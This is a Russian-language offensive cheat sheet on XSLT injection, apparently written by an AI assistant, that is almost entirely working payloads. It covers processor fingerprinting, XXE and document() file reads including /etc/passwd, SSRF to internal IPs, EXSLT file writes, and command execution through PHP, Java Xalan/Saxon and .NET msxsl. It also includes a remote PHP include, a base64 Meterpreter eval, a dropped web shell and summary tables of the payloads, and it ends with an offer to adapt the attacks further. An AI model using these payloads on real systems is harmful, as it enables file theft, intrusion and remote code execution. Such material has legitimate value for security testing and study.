# XSLT-инъекция

Обработка непроверенной XSL-таблицы стилей может позволить злоумышленнику изменить структуру и содержимое результирующего XML, включить произвольные файлы из файловой системы или выполнить произвольный код.

---

## Содержание

- Инструменты
- Методология
  - Определение поставщика и версии
  - Внешняя сущность
  - Чтение файлов и SSRF через document()
  - Запись файлов с расширением EXSLT
  - Удалённое выполнение кода через PHP-обёртку
  - Удалённое выполнение кода в Java
  - Удалённое выполнение кода в .NET
- Лабораторные работы
- Ссылки

---

## Инструменты

В настоящее время не существует известных инструментов для помощи в эксплуатации XSLT.

---

## Методология

### Определение поставщика и версии

Следующий код позволяет определить версию и поставщика XSLT-процессора:

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    <xsl:value-of select="system-property('xsl:vendor')"/>
  </xsl:template>
</xsl:stylesheet>
```

Более развёрнутый пример:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<br />Version: <xsl:value-of select="system-property('xsl:version')" />
<br />Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br />Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
</body>
</html>
```

---

### Внешняя сущность (XXE)

Не забудьте проверить наличие XXE, когда встречаете XSLT-файлы. Пример использования внешней сущности для чтения файла:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "C:\secretfruit.txt">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    Fruits &ext_file;:
    <!-- Цикл по каждому фрукту -->
    <xsl:for-each select="fruit">
      <!-- Вывод имени: описание -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
```

---

### Чтение файлов и SSRF через document()

Функция `document()` позволяет загружать внешние ресурсы, что может быть использовано для SSRF и чтения файлов:

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    <xsl:copy-of select="document('http://172.16.132.1:25')"/>
    <xsl:copy-of select="document('/etc/passwd')"/>
    <xsl:copy-of select="document('file:///c:/winnt/win.ini')"/>
    Fruits:
    <!-- Цикл по каждому фрукту -->
    <xsl:for-each select="fruit">
      <!-- Вывод имени: описание -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
```

---

### Запись файлов с расширением EXSLT

EXSLT (Extensible Stylesheet Language Transformations) — это набор расширений к языку XSLT. В некоторых реализациях он позволяет записывать файлы:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common" 
  extension-element-prefixes="exploit"
  version="1.0">
  <xsl:template match="/">
    <exploit:document href="evil.txt" method="text">
      Hello World!
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

---

### Удалённое выполнение кода через PHP-обёртку

**Выполнение функции readfile():**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<xsl:value-of select="php:function('readfile','index.php')" />
</body>
</html>
```

**Выполнение функции scandir() для просмотра содержимого директории:**

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Выполнение удалённого PHP-файла через assert():**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
  <xsl:variable name="payload">
    include("http://10.10.10.10/test.php")
  </xsl:variable>
  <xsl:variable name="include" select="php:function('assert',$payload)"/>
</body>
</html>
```

**Выполнение PHP Meterpreter через PHP-обёртку:**

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:variable name="eval">
      eval(base64_decode('Base64-encoded Meterpreter code'))
    </xsl:variable>
    <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Запись удалённого PHP-файла через file_put_contents():**

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:value-of select="php:function('file_put_contents','/var/www/webshell.php','&lt;?php echo system($_GET[&quot;command&quot;]); ?&gt;')" />
  </xsl:template>
</xsl:stylesheet>
```

---

### Удалённое выполнение кода в Java

**Использование Xalan (Apache):**

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtobject,'ls')"/>
    <xsl:variable name="processString" select="ob:toString($process)"/>
    <xsl:value-of select="$processString"/>
  </xsl:template>
</xsl:stylesheet>
```

**Использование Saxon:**

```xml
<xml version="1.0"?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
  <xsl:template match="/">
    <xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')" xmlns:Runtime="java:java.lang.Runtime"/>
  </xsl:template>
</xsl:stylesheet>
```

---

### Удалённое выполнение кода в .NET

**Пример с C# и msxsl:**

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:App="http://www.tempuri.org/App">
    <msxsl:script implements-prefix="App" language="C#">
      <![CDATA[
        public string ToShortDateString(string date)
          {
              System.Diagnostics.Process.Start("cmd.exe");
              return "01/01/2001";
          }
      ]]>
    </msxsl:script>
    <xsl:template match="ArrayOfTest">
      <TABLE>
        <xsl:for-each select="Test">
          <TR>
          <TD>
            <xsl:value-of select="App:ToShortDateString(TestDate)" />
          </TD>
          </TR>
        </xsl:for-each>
      </TABLE>
    </xsl:template>
</xsl:stylesheet>
```

**Более продвинутый пример с выполнением команды и возвратом результата:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="urn:my-scripts">

<msxsl:script language="C#" implements-prefix="user">
<![CDATA[
public string execute(){
  System.Diagnostics.Process proc = new System.Diagnostics.Process();
  proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
  proc.StartInfo.RedirectStandardOutput = true;
  proc.StartInfo.UseShellExecute = false;
  proc.StartInfo.Arguments = "/c dir";
  proc.Start();
  proc.WaitForExit();
  return proc.StandardOutput.ReadToEnd();
}
]]>
</msxsl:script>

<xsl:template match="/fruits">
  --- BEGIN COMMAND OUTPUT ---
  <xsl:value-of select="user:execute()"/>
  --- END COMMAND OUTPUT --- 
</xsl:template>
</xsl:stylesheet>
```


## Что важно запомнить

| Ключевой момент | Объяснение |
|---|---|
| **Что такое XSLT-инъекция** | Внедрение непроверенной XSL-таблицы стилей для атаки на приложение |
| **Основные возможности** | Чтение файлов, SSRF, запись файлов, RCE |
| **Определение версии** | Используйте `system-property('xsl:vendor')` |
| **XXE в XSLT** | Всегда проверяйте XXE, если есть XSLT |
| **document()** | Позволяет читать файлы и делать SSRF |
| **EXSLT** | Расширение для записи файлов |
| **PHP** | Используйте пространство имён `xmlns:php="http://php.net/xsl"` для RCE |
| **Java** | Используйте `java.lang.Runtime` через Xalan или Saxon |
| **.NET** | Используйте `msxsl:script` с C# для выполнения команд |

---

## Быстрый справочник (шпаргалка)

| Задача | Пример кода |
|---|---|
| **Определить версию** | `<xsl:value-of select="system-property('xsl:vendor')"/>` |
| **Прочитать файл** | `<xsl:copy-of select="document('/etc/passwd')"/>` |
| **SSRF** | `<xsl:copy-of select="document('http://internal-ip:port')"/>` |
| **Запись файла (EXSLT)** | `<exploit:document href="evil.txt" method="text">` |
| **RCE PHP (readfile)** | `php:function('readfile','index.php')` |
| **RCE PHP (scandir)** | `php:function('scandir', '.')` |
| **RCE PHP (file_put_contents)** | `php:function('file_put_contents','/path/shell.php','code')` |
| **RCE Java (Xalan)** | `rt:exec(rt:getRuntime(),'ls')` |
| **RCE .NET (msxsl)** | `<msxsl:script language="C#"> System.Diagnostics.Process.Start("cmd.exe");` |

Если хочешь, могу подробнее разобрать любой конкретный вектор атаки или показать, как адаптировать код под разные ситуации.
